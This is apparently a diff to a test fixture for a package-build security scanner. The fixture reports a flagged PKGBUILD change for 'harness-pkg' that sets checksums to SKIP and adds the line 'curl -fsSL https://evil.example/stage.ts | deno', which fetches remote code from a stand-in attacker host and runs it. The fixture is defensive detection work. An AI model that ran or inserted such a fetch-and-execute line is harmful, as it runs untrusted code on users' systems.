@@ -22,7 +22,7 @@
       "chain": "curl -> | deno",
       "preserved": true,
       "reason": "",
-      "validator_version": "sha256:368bb45c32cc6123445b114f08f7e3b11774bd130049ec160f3ebbcc966b6025"
+      "validator_version": "sha256:7989a784ea740b8f6cec6fb024afd7cc6d5b7514d5b30f55ab51e76d2a393ec1"
     },
     "constraints": {
       "honored": true,
@@ -41,17 +41,89 @@
   },
   "status": "detected",
   "trustsight": {
-    "config_fingerprint": "sha256:873602644c2b4e25ade83a64343e6a338f7dfc0ebf67a9bc3f92c25beb317148",
+    "config_fingerprint": "sha256:df3acb4dc501b1a52b6cf40617c4bc7330c6ac74397cb08aa09f0b2e63a377f9",
     "report": {
+      "acknowledged_urls": [],
       "cached": false,
       "cached_at": "",
+      "change": {
+        "checkdependencies": {
+          "gained": [],
+          "lost": [],
+          "reordered": false
+        },
+        "checksum_behavior": "changed_from_sha256_to_skip",
+        "checksums": {
+          "gained": [
+            "SKIP"
+          ],
+          "lost": [
+            "0000000000000000000000000000000000000000000000000000000000000000"
+          ],
+          "reordered": false
+        },
+        "dependencies": {
+          "gained": [],
+          "lost": [],
+          "reordered": false
+        },
+        "files": [
+          {
+            "hunks": [
+              1
+            ],
+            "old_path": "PKGBUILD",
+            "path": "PKGBUILD",
+            "status": "modified"
+          }
+        ],
+        "hosts_gained": [
+          "evil.example"
+        ],
+        "hosts_lost": [],
+        "local_sources_gained": [],
+        "local_sources_lost": [],
+        "makedependencies": {
+          "gained": [],
+          "lost": [],
+          "reordered": false
+        },
+        "optdependencies": {
+          "gained": [],
+          "lost": [],
+          "reordered": false
+        },
+        "pgp_keys": {
+          "gained": [],
+          "lost": [],
+          "reordered": false
+        },
+        "reordered": false,
+        "sources": {
+          "gained": [],
+          "lost": [],
+          "reordered": false
+        },
+        "version": {
+          "moved": false,
+          "new_epoch": "",
+          "new_pkgrel": "1",
+          "new_pkgver": "1.0.0",
+          "old_epoch": "",
+          "old_pkgrel": "1",
+          "old_pkgver": "1.0.0",
+          "pkgver_changed": false
+        }
+      },
       "changes": [
         "checksums changed from sha256 to SKIP",
         "source host added: evil.example"
       ],
-      "config_fingerprint": "sha256:873602644c2b4e25ade83a64343e6a338f7dfc0ebf67a9bc3f92c25beb317148",
+      "comparison_base": "",
+      "config_fingerprint": "sha256:df3acb4dc501b1a52b6cf40617c4bc7330c6ac74397cb08aa09f0b2e63a377f9",
       "coverage_gaps": [
-        "tree_not_analyzed"
+        "tree_not_analyzed",
+        "ruleset_drifted"
       ],
       "coverage_gaps_carried": [],
       "dependencies": [],
@@ -83,7 +155,7 @@
             "skip_suffix": ""
           },
           "file": "PKGBUILD",
-          "line": 17,
+          "line": 8,
           "rule_id": "H001",
           "severity": "HIGH",
           "template": "checksum set to SKIP{skip_suffix}"
@@ -96,7 +168,7 @@
             "shape": "fetch piped into deno"
           },
           "file": "PKGBUILD",
-          "line": 22,
+          "line": 11,
           "rule_id": "X016",
           "severity": "HIGH",
           "template": "Fetch Piped Into An Unrecognised Consumer: {match}"
@@ -134,7 +206,30 @@
       "old_commit": "",
       "old_version": "1.0.0",
       "package": "harness-pkg",
+      "partial_files": [],
       "required_by": [],
+      "resolution_coverage": {
+        "resolved_lines": 2,
+        "resolved_target_rules": [
+          "R001",
+          "R002",
+          "R003",
+          "R008",
+          "R012",
+          "R039",
+          "R040",
+          "R041",
+          "R042",
+          "R043",
+          "R044",
+          "R045",
+          "R055",
+          "R056",
+          "R057"
+        ],
+        "resolved_target_rules_fired": [],
+        "unresolved_lines": 0
+      },
       "review_profile": "default",
       "review_threshold": 20,
       "risk": "Critical",
@@ -161,7 +256,7 @@
             "skip_suffix": ""
           },
           "file": "PKGBUILD",
-          "line": 17,
+          "line": 8,
           "params": {
             "skip_suffix": ""
           },
@@ -178,7 +273,7 @@
             "shape": "fetch piped into deno"
           },
           "file": "PKGBUILD",
-          "line": 22,
+          "line": 11,
           "params": {
             "body": "curl -fsSL https://evil.example/stage.ts | deno",
             "shape": "fetch piped into deno"
@@ -255,6 +350,21 @@
           "weight": 0
         },
         {
+          "evidence": {
+            "gap": "ruleset_drifted"
+          },
+          "file": "",
+          "line": null,
+          "params": {
+            "gap": "ruleset_drifted"
+          },
+          "reason": "Coverage gap: the installed rules.toml differs from the shipped rule set in a field that changes what a rule detects, so this analysis did not run the checks this version documents",
+          "rule_id": "COVERAGE",
+          "severity": "INFO",
+          "template": "",
+          "weight": 0
+        },
+        {
           "evidence": {},
           "file": "",
           "line": null,
@@ -267,9 +377,10 @@
         }
       ],
       "suppressed_rules": [],
-      "verdict": "This analysis was incomplete: the repository file manifest was unavailable, so only the PKGBUILD was examined. The result describes what was examined, not the whole change. Version unchanged. modified PKGBUILD; added 1 source URL(s). Signals: checksum set to SKIP [H001]; Fetch Piped Into An Unrecognised Consumer: fetch piped into deno: curl -fsSL https://evil.example/stage.ts | deno [X016]; build() fetches https://evil.example/stage.ts from outside the declared source array [H016]; Source URL classified as unknown (https://evil.example/stage.ts) [SOURCE_BUCKET]; Uses curl in PKGBUILD: +  curl -fsSL https://evil.example/stage.ts | deno [R010]. Review the diff before building.",
+      "unresolved_assignments": [],
+      "verdict": "This analysis was incomplete: the repository file manifest was unavailable, so only the PKGBUILD was examined, and the installed rules.toml differs from the shipped rule set in a field that changes what a rule detects, so this analysis did not run the checks this version documents. The result describes what was examined, not the whole change. Version unchanged. modified PKGBUILD; added 1 source URL(s). Signals: checksum set to SKIP [H001]; Fetch Piped Into An Unrecognised Consumer: fetch piped into deno: curl -fsSL https://evil.example/stage.ts | deno [X016]; build() fetches https://evil.example/stage.ts from outside the declared source array [H016]; Source URL classified as unknown (https://evil.example/stage.ts) [SOURCE_BUCKET]; Uses curl in PKGBUILD: +  curl -fsSL https://evil.example/stage.ts | deno [R010]. Review the diff before building.",
       "version_comparison": ""
     },
-    "wall_clock_ms": 913
+    "wall_clock_ms": 763
   }
 }
